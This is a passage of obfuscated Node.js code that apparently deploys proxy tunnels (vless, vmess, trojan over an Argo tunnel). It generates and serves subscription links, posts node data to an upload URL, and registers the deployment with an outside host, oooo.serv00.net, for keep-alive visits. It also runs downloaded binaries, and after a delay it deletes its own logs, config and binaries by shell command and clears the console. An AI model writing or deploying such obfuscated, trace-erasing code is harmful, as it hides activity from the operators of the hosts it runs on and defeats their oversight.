_0xf58103={_0x2b0b41:0x293,_0x36311d:0x1f3,_0x32f29a:0x270,_0x5aae24:0x25e,_0x279a31:0x22f,_0x5a7c81:0x208,_0x26bd75:0x27a,_0x8fe553:0x24f,_0x26d257:0x1fb,_0x56eaa2:0x227,_0x274a0f:0x25c,_0x238c46:0x24f,_0x444577:0x27b,_0x15a71e:0x22e};setTimeout(()=>{const _0x38ae5f={_0x1099ce:0x25c,_0x5a31c4:0x24f,_0x2afefa:0x27c},_0x385792=_0x3810,_0x32b67e={'v':'2','ps':''+_0x3b4b27,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x385792(0x2a6),'net':'ws','type':_0x385792(0x2a6),'host':_0x8d814b,'path':_0x385792(_0xf58103._0x2b0b41),'tls':'tls','sni':_0x8d814b,'alpn':'','fp':_0x385792(_0xf58103._0x36311d)},_0x55c1fb=_0x385792(_0xf58103._0x32f29a)+UUID+'@'+CFIP+':'+CFPORT+_0x385792(_0xf58103._0x5aae24)+_0x8d814b+_0x385792(0x233)+_0x8d814b+_0x385792(_0xf58103._0x279a31)+_0x3b4b27+'\x0a\x0avmess://'+Buffer[_0x385792(_0xf58103._0x5a7c81)](JSON[_0x385792(_0xf58103._0x26bd75)](_0x32b67e))[_0x385792(0x25c)](_0x385792(_0xf58103._0x8fe553))+_0x385792(_0xf58103._0x26d257)+UUID+'@'+CFIP+':'+CFPORT+_0x385792(0x263)+_0x8d814b+_0x385792(0x233)+_0x8d814b+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x3b4b27+_0x385792(_0xf58103._0x56eaa2);console['log'](Buffer[_0x385792(0x208)](_0x55c1fb)[_0x385792(_0xf58103._0x274a0f)]('base64')),fs['writeFileSync'](subPath,Buffer[_0x385792(_0xf58103._0x5a7c81)](_0x55c1fb)[_0x385792(_0xf58103._0x274a0f)](_0x385792(_0xf58103._0x238c46))),console[_0x385792(_0xf58103._0x444577)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x385792(_0xf58103._0x15a71e)]('/'+SUB_PATH,(_0x55bba9,_0x13d404)=>{const _0x5b9e91=_0x385792,_0x13a0a4=Buffer['from'](_0x55c1fb)[_0x5b9e91(_0x38ae5f._0x1099ce)](_0x5b9e91(_0x38ae5f._0x5a31c4));_0x13d404[_0x5b9e91(0x219)](_0x5b9e91(0x22c),_0x5b9e91(_0x38ae5f._0x2afefa)),_0x13d404[_0x5b9e91(0x225)](_0x13a0a4);}),_0x58a8aa(_0x55c1fb);},0x7d0);});}}async function uploadNodes(){const _0x56d1c1={_0x298ddc:0x289,_0x46d85e:0x1ed,_0x47b467:0x2a1,_0x50eefe:0x1ee,_0x38df52:0x246,_0x14fc2c:0x1f0,_0x5282a7:0x1ee,_0x3a0f18:0x27b},_0x2dc7dd=_0x2c5f9f;if(UPLOAD_URL&&PROJECT_URL){const _0x110c3c=PROJECT_URL+'/'+SUB_PATH,_0x213d01={'subscription':[_0x110c3c]};try{const _0x31b33c=await axios[_0x2dc7dd(0x1f0)](UPLOAD_URL+_0x2dc7dd(0x27e),_0x213d01,{'headers':{'Content-Type':_0x2dc7dd(_0x56d1c1._0x298ddc)}});return _0x31b33c&&_0x31b33c['status']===0xc8?(console[_0x2dc7dd(0x27b)](_0x2dc7dd(_0x56d1c1._0x46d85e)),_0x31b33c):null;}catch(_0xa13940){if(_0xa13940[_0x2dc7dd(0x2a1)]){if(_0xa13940[_0x2dc7dd(_0x56d1c1._0x47b467)][_0x2dc7dd(_0x56d1c1._0x50eefe)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x169932=fs[_0x2dc7dd(0x20e)](listPath,'utf-8'),_0x518c76=_0x169932[_0x2dc7dd(0x2a4)]('\x0a')['filter'](_0x47727a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2dc7dd(0x244)](_0x47727a));if(_0x518c76[_0x2dc7dd(_0x56d1c1._0x38df52)]===0x0)return;const _0x36d395=JSON['stringify']({'nodes':_0x518c76});try{const _0x59ee68=await axios[_0x2dc7dd(_0x56d1c1._0x14fc2c)](UPLOAD_URL+_0x2dc7dd(0x261),_0x36d395,{'headers':{'Content-Type':_0x2dc7dd(0x289)}});return _0x59ee68&&_0x59ee68[_0x2dc7dd(_0x56d1c1._0x5282a7)]===0xc8?(console[_0x2dc7dd(_0x56d1c1._0x3a0f18)](_0x2dc7dd(0x2a7)),_0x59ee68):null;}catch(_0x5a95f6){return null;}}else return;}}function cleanFiles(){const _0x25e3c6={_0x5cf7c5:0x24e,_0x43ec67:0x23c},_0x2946c5={_0x677795:0x27b,_0x5f1b23:0x29b};setTimeout(()=>{const _0xbe30bd={_0xe31e3e:0x1ff,_0x42efd3:0x29b},_0x31cfdf=_0x3810,_0x58b97a=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x58b97a[_0x31cfdf(0x290)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x58b97a['push'](phpPath);process[_0x31cfdf(0x247)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x58b97a[_0x31cfdf(0x239)]('\x20')+_0x31cfdf(_0x25e3c6._0x5cf7c5),_0x46d2ea=>{const _0x49b8d2=_0x31cfdf;console[_0x49b8d2(0x259)](),console[_0x49b8d2(_0x2946c5._0x677795)](_0x49b8d2(0x1ff)),console[_0x49b8d2(0x27b)](_0x49b8d2(_0x2946c5._0x5f1b23));}):exec(_0x31cfdf(0x223)+_0x58b97a['join']('\x20')+_0x31cfdf(_0x25e3c6._0x43ec67),_0x35ed02=>{const _0x22b94b=_0x31cfdf;console['clear'](),console[_0x22b94b(0x27b)](_0x22b94b(_0xbe30bd._0xe31e3e)),console['log'](_0x22b94b(_0xbe30bd._0x42efd3));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4ba174={_0x10eb6a:0x27b,_0x109e4e:0x1f0,_0x10afa0:0x289,_0x14b317:0x205},_0x13bf35=_0x2c5f9f;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x13bf35(_0x4ba174._0x10eb6a)](_0x13bf35(0x203));return;}try{const _0x2f7f6d=await axios[_0x13bf35(_0x4ba174._0x109e4e)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x13bf35(_0x4ba174._0x10afa0)}});return console[_0x13bf35(_0x4ba174._0x10eb6a)]('automatic\x20access\x20task\x20added\x20successfully'),_0x2f7f6d;}catch(_0x16c47f){return console['error'](_0x13bf35(_0x4ba174._0x14b317)+_0x16c47f['message']),null;}}async function startserver(){const _0x23ba86=_0x2c5f9f;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2d8373){console[_0x23ba86(0x2a0)](_0x23ba86(0x1ef),_0x2d8373);}}startserver()[_0x2c5f9f(0x298)](_0x85bdfb=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x85bdfb);}),app[_0x2c5f9f(0x215)](PORT,()=>console[_0x2c5f9f(0x27b)](_0x2c5f9f(0x29c)+PORT+'!'));
